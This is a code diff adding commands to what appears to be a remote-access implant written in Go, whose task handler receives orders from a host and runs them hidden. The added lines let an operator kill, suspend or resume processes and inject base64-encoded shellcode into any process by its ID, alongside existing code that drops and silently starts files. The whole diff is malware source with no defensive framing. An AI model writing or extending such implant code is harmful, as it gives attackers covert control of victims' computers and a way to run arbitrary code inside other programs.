@@ -594,6 +594,47 @@ func runTask(tID, command, argsJSON, host, port string, useTLS bool, hwid string
 		_ = os.WriteFile(p, b, 0644)
 		_ = hiddenCmd(p).Start()
 		out = "started " + p
+	case "process_kill", "process_suspend", "process_resume", "process_inject":
+		pid := atoiDef(argStr(args, "pid", "PID"), 0)
+		if pid <= 0 {
+			out, code = "bad pid", 1
+			break
+		}
+		switch cmd {
+		case "process_kill":
+			b, err := hiddenCmd("taskkill", "/F", "/PID", fmt.Sprint(pid)).CombinedOutput()
+			out = strings.TrimSpace(string(b))
+			if err != nil {
+				code = 1
+			}
+			if out == "" {
+				out = fmt.Sprintf("terminated %d", pid)
+			}
+		case "process_suspend":
+			if processSuspendResume(uint32(pid), true) {
+				out = fmt.Sprintf("suspended %d", pid)
+			} else {
+				out, code = fmt.Sprintf("suspend failed for %d (needs rights)", pid), 1
+			}
+		case "process_resume":
+			if processSuspendResume(uint32(pid), false) {
+				out = fmt.Sprintf("resumed %d", pid)
+			} else {
+				out, code = fmt.Sprintf("resume failed for %d (needs rights)", pid), 1
+			}
+		default: // process_inject
+			raw := argStr(args, "shellcode", "sc", "data")
+			sc, derr := base64.StdEncoding.DecodeString(raw)
+			if derr != nil || len(sc) == 0 {
+				out, code = "bad shellcode blob", 1
+				break
+			}
+			if injectShellcode(uint32(pid), sc) {
+				out = fmt.Sprintf("injected %d bytes into %d", len(sc), pid)
+			} else {
+				out, code = fmt.Sprintf("injection into %d failed", pid), 1
+			}
+		}
 	case "download":
 		rp := argStr(args, "remote_path", "path", "RemotePath")
 		fid := argStr(args, "file_id", "FileID")
